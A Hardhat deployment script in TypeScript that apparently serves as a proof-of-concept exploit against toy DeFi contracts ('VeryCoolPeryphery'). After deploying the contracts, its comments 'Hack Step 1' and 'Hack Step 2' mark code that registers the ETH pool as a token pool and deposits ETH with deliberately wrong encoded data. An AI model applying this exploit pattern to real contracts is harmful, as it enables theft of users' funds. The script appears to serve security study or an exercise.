import { VeryCoolPeryphery } from "../typechain/VeryCoolPeryphery";
import { VeryCoolPoolTokens } from "../typechain/VeryCoolPoolTokens";
import { deploy, DeploymentFlags } from "./utils/deployment";
import { ethers } from "ethers";
import hre from "hardhat";

/**
 * Deploy SimpleContract
 */
async function main() {
    // Deploy AMM
    const VeryCoolPeryphery: VeryCoolPeryphery = (await deploy(
        "VeryCoolPeryphery",
        ["0x596b40b23aEdda314AfD810a76bC97B18e2A084E", "0xe5Fe0148D91567591EC859cBb2F8bC03803Bfc7d"],
        DeploymentFlags.Deploy,
    )) as VeryCoolPeryphery;
    console.log(`VeryCoolPeryphery deployed at ${VeryCoolPeryphery.address}`);

    // Deploy token pool
    const VeryCoolPoolTokens: VeryCoolPoolTokens = (await deploy(
        "VeryCoolPoolTokens",
        ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0xdAC17F958D2ee523a2206206994597C13D831ec7"],
        DeploymentFlags.Deploy,
    )) as VeryCoolPoolTokens;
    console.log(`VeryCoolPoolTokens deployed at ${VeryCoolPoolTokens.address}`);

    // Add new token pool
    await VeryCoolPeryphery.addTokenPool(VeryCoolPoolTokens.address);

    // Get encoded data for tokens pool
    //const signer = (await hre.ethers.getSigners())[0];
    const paramsToken = await VeryCoolPoolTokens.getEncodedData(22, 33);

    // Call tokens pool
    const valueTokens = ethers.utils.parseEther("0");
    await VeryCoolPeryphery.deposit([VeryCoolPoolTokens.address], [paramsToken], [valueTokens], { value: valueTokens });

    // Hack Step 1: Register ETH pool as token pool
    const ETHPool = await VeryCoolPeryphery.defaultETHPool();
    await VeryCoolPeryphery.addTokenPool(ETHPool);

    // Get latest block timestamp
    const provider = await hre.ethers.getDefaultProvider();
    const latestBlock = await provider.getBlock("latest");

    // Hack Step 2: Add to ETH pool with wrong encoded data
    const paramsETH = await VeryCoolPoolTokens.getEncodedData(
        latestBlock.timestamp + 100,
        "0xd91567591ec859cbb2f8bc03803bfc7d",
    );
    const valueETH = ethers.utils.parseEther("1");
    await VeryCoolPeryphery.deposit([ETHPool], [paramsETH], [valueETH], { value: valueETH });
}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });
